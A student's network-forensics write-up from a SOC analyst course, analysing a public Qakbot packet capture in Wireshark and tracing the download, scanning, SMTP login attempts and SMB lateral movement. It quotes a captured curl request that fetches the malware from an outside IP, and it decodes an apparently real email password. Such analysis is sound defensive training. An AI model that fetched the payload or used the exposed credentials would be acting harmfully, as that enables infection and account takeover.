# Network Forensics Learning Project: Qakbot Malware Analysis

## Project Overview

This repository documents my hands-on learning experience with network forensics analysis using Wireshark as part of **The Cyber Mentor's SOC Analyst 101 Course - Network Analysis Section**. Through this project, I investigated a malware incident involving the Qakbot malware family, learning to identify indicators of compromise (IOCs), track lateral movement, and analyze post-compromise activities.

**Course Context**: This analysis is part of TCM's comprehensive SOC Analyst training program, specifically focusing on developing practical network analysis skills essential for Security Operations Center roles.

**PCAP Source**: The PCAP file analyzed in this project is publicly available from [malware-traffic-analysis.net](https://www.malware-traffic-analysis.net/)

## Learning Objectives

- Master Wireshark packet analysis fundamentals
- Understand malware network behavior patterns
- Learn to identify and extract IOCs from network traffic
- Practice malware analysis techniques
- Develop skills in threat intelligence correlation

## Lab Setup and Initial Configuration

### Setting Up the Investigation Environment

The first lesson I learned was the importance of proper timestamp configuration for consistent documentation:

```
View → Time Display Format → UTC Date and Time of Day
```

**Why This Matters**: Consistent timestamps are crucial for creating accurate incident timelines and correlating events across different data sources.

### Getting the Big Picture

I started my analysis with high-level statistics to understand the scope of the incident:

**Capture File Properties Analysis:**
- **Total Packets**: Over 50,000 packets captured
- **Time Duration**: Approximately 3 hours of activity
- **Key Learning**: Always start broad before diving into specific details

![capture file properties](https://github.com/user-attachments/assets/1ebcf508-fbfc-4015-b428-d3496e1b2a42)

## Step-by-Step Traffic Analysis

### 1. Conversation Analysis - Finding the Main Players

Using Wireshark's conversation feature, I identified the primary communication patterns:

- **Most Active Communication**: 10.0.0.149 ↔ 10.0.0.6
- **Hypothesis**: 10.0.0.149 appears to be our victim machine
- **Target**: 10.0.0.6 is another host on the same subnet
![conversations](https://github.com/user-attachments/assets/ad610810-e8b2-45b9-868b-e96fd2ad4bae)

**Learning Note**: Conversation analysis helps quickly identify the most significant network relationships in an incident.

### 2. Protocol Hierarchy - Understanding the Attack Landscape

The protocol breakdown revealed:
- High volumes of NetBIOS, SMB, LDAP, and RPC traffic
- Only 4 HTTP packets (unencrypted)

**Strategy Decision**: I chose to start with HTTP traffic since it's easier to analyze and often contains initial infection vectors.

### 3. Enhancing Wireshark Display

To better analyze the traffic, I customized Wireshark columns:
```
Edit → Preferences → Columns → Green Plus
```
Added:
- Source Port (unresolved)
- Destination Port (unresolved)

**Pro Tip**: Customizing your display makes analysis much more efficient!

## HTTP Traffic Deep Dive

### Identifying Initial Infection Vectors

Applied filter: `http`

**First Suspicious Packet Analysis:**

When I examined the HTTP request header, I immediately spotted red flags:
- **Host field**: Used an IP address instead of a domain name
- **Request**: GET request for a `.dat` file (unusual file extension)
![http request header and  dat file](https://github.com/user-attachments/assets/c315c32c-577a-4b05-adcc-fe44f41c7eee)

### Following the HTTP Stream

Right-click packet → Follow → HTTP Stream

```http
GET /86607.dat HTTP/1.1
Host: 128.254.207.55
User-Agent: curl/7.83.1
Accept: */*
```

**Red Flags Identified:**
1. **User-Agent**: `curl/7.83.1` - End users typically don't use curl unless running scripts
2. **File Type**: Server responding with an executable attachment

### Analyzing the Malicious File

The server response contained:
```
MZ......................@.............................................	.!..L.!This program cannot be run in DOS mode.
```

**What I Learned:**
- **Magic Bytes**: `MZ` at the beginning identifies this as a DOS MZ executable
- **Research Method**: I googled "List of file signatures" and used Ctrl+F to find MZ
![MZ magic number](https://github.com/user-attachments/assets/8c130392-6f1d-43bc-ab48-c579b5244197)

- **Result**: Confirmed this is a DOS MZ executable

**Key Insight**: The victim downloaded an executable file using curl - highly suspicious behavior!

## Malware Analysis Section

### Extracting and Analyzing the Malware

**File Analysis Commands:**
```bash
file 86607.dat
# Output: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, 6 sections

sha256sum 86607.dat
# Hash: 713207d9d9875ec88d2f3a53377bf8c2d620147a4199eb183c13a7e957056432
```

### Threat Intelligence Research

**VirusTotal Analysis:**
- Submitted hash to VirusTotal for reputation check
- **Result**: Confirmed malicious
![virustotal](https://github.com/user-attachments/assets/56e589d8-3098-41d3-b7ec-327ec9c84f12)

**Malware Bazaar Research:**
- Searched using: `sha256:713207d9d9875ec88d2f3a53377bf8c2d620147a4199eb183c13a7e957056432`
- **Discovery**: Associated with Qakbot malware family
![quackbot](https://github.com/user-attachments/assets/1b91a7e7-048d-44b7-a387-2879a4866af9)

**Learning Resource**: I found this helpful article about Qakbot: https://news.sophos.com/en-us/2022/03/10/qakbot-decoded/

## Post-Compromise Activity Analysis

### ARP Scanning Detection

Based on my research, Qakbot commonly performs ARP scans for network reconnaissance. I looked for this activity in our capture.

**Filter Used**: `arp and eth.dst eq ff:ff:ff:ff:ff:ff`
![arp and eth dst](https://github.com/user-attachments/assets/982fc5c6-503f-422e-89b8-a3e839234434)

**Findings:**
- IP addresses appeared in descending order - clear evidence of systematic ARP scanning
- **Purpose**: Attackers use ARP scans to identify active IP addresses within the network

### ICMP Analysis - Ping Sweeps

**Filter Used**: `icmp`

**Results:**
- Attacker identified active hosts: 10.0.0.6 and 10.0.0.1
- **Next Step**: Likely port scanning of identified hosts

### Port Scanning Analysis

**Filter Used**: `ip.addr==10.0.0.1`
![10 0 0 1](https://github.com/user-attachments/assets/ec8dda9e-7b9e-46ea-8a33-3a15f618e402)

**Observations:**
- Multiple incomplete TCP handshake attempts
- Reset flags on ports 445, 139, and 80
- **Conclusion**: Attacker performing port reconnaissance

## Credential Harvesting Discovery

### SMTP Traffic Analysis

**Filter Used**: `smtp`

Found interesting `AUTH-LOGIN` packet:
Right-click → Follow → TCP Stream
![auth login](https://github.com/user-attachments/assets/436796e9-f711-4706-9f9d-985268c09336)

```
220 wwm171-181.yes-hosting.com ESMTP Sat, 04 Feb 2023 02:29:52 +0700

EHLO localhost

250-wwm171-181.yes-hosting.com Hello localhost [71.167.93.52], pleased to meet you
250-ETRN
250-AUTH LOGIN CRAM-MD5 PLAIN
250-8BITMIME
250-ENHANCEDSTATUSCODES
250 SIZE 20480000

AUTH LOGIN

334 VXNlcm5hbWU6

YXJ0aGl0QG1hY25lbHMuY28udGg=

334 UGFzc3dvcmQ6

QXJ0MTIzNDU2

535 5.7.8 Authentication failed

*

500 5.0.0 Unrecognized command

QUIT

221 2.0.0 See ya in cyberspace
```

### Decoding Base64 Credentials

**Tool Used**: CyberChef (https://cyberchef.org/)
**Process**: 
1. Cleaned encoding from numbers
2. Used "From Base64" operation

**Decoded Credentials:**
```
Username: arthit@macnels.co.th
Password: Art123456
```

**Note**: Authentication failed, but we identified potentially compromised credentials.

## Lateral Movement Analysis

### SMB Traffic Investigation

Active Directory environments commonly use SMB for communication. I investigated file transfers that might indicate lateral movement.

**Analysis Method**: File → Export Objects → SMB
![smb object list](https://github.com/user-attachments/assets/7f06ac32-eaf5-48f9-8cbb-753f96d0082b)

**Suspicious Findings:**
- 6 potentially suspicious DLL/DLL.cfg files
- All files transferred to 10.0.0.6 (identified as domain controller)
- Randomly named DLL files are highly suspicious

### Extracted Files Analysis

**Files Found:**
- %5cefweioirfbtk.dll
- %5cefweioirfbtk.dll.cfg
- %5cltoawuimupfxvg.dll
- %5cltoawuimupfxvg.dll.cfg
- %5cumtqqzkklrgp.dll
- %5cumtqqzkklrgp.dll.cfg

**Analysis Commands:**
```bash
# Create directory for analysis
mkdir smb
# Analyze file types
file *
```

**Results:**
```
%5cefweioirfbtk.dll:       PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, 6 sections
%5cefweioirfbtk.dll.cfg:   data
%5cltoawuimupfxvg.dll:     PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, 6 sections
%5cltoawuimupfxvg.dll.cfg: data
%5cumtqqzkklrgp.dll:       PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, 6 sections
%5cumtqqzkklrgp.dll.cfg:   data
```

**Hash Analysis:**
```bash
sha256sum *
```

**Critical Discovery**: All DLL files share the same hash as the original Qakbot malware, confirming lateral movement to the domain controller (10.0.0.6).

## Key Learning Outcomes

### Technical Skills Developed
1. **Wireshark Proficiency**: Learned essential filtering, following streams, and object extraction
2. **Malware Analysis**: Understanding file signatures, hash analysis, and threat intelligence correlation
3. **Network Forensics**: Identifying attack patterns, lateral movement, and post-compromise activities
4. **OSINT Research**: Using public resources for malware identification and behavior analysis

### Indicators of Compromise (IOCs) Identified

**Network IOCs:**
- IP Address: 128.254.207.55 (malware hosting server)
- File Hash: 713207d9d9875ec88d2f3a53377bf8c2d620147a4199eb183c13a7e957056432

**Behavioral IOCs:**
- ARP scanning activity
- ICMP ping sweeps
- Port scanning on 445, 139, and 80
- SMB file transfers to domain controller
- Curl-based malware downloads

**Compromised Systems:**
- Primary Victim: 10.0.0.149
- Lateral Movement Target: 10.0.0.6 (Domain Controller)

### Attack Timeline Summary

1. **Initial Infection**: Victim (10.0.0.149) downloads Qakbot via curl
2. **Network Reconnaissance**: ARP scanning and ICMP ping sweeps
3. **Credential Harvesting**: SMTP authentication attempts
4. **Lateral Movement**: DLL deployment to domain controller (10.0.0.6)
5. **Persistence**: Multiple malware copies with configuration files

## Lessons Learned

**Investigation Best Practices:**
- Always start with high-level statistics before diving into details
- Use multiple analysis approaches (conversation, protocol hierarchy, specific filters)
- Document everything with proper timestamps
- Correlate findings with threat intelligence
- Focus on systems that received malware for continued analysis

**Key Takeaway**: The attacker successfully compromised the victim machine and attempted lateral movement to the domain controller, representing a significant security incident requiring immediate containment and remediation.

## Tools and Resources Used

- **Wireshark**: Primary packet analysis tool
- **CyberChef**: Base64 decoding and data transformation
- **VirusTotal**: Malware hash reputation checking
- **Malware Bazaar**: Threat intelligence research
- **Command Line Tools**: file, sha256sum for malware analysis

## Next Steps for Further Learning

- Study Active Directory attack techniques
- Learn about malware sandboxing and dynamic analysis
- Explore automated threat hunting with SIEM tools
- Practice incident response procedures

---

*This project was completed as part of **The Cyber Mentor's SOC Analyst 101 Course - Network Analysis Section**. The analysis demonstrates practical application of network forensics techniques taught in the course and showcases hands-on experience with real-world malware investigation scenarios in a controlled learning environment.*
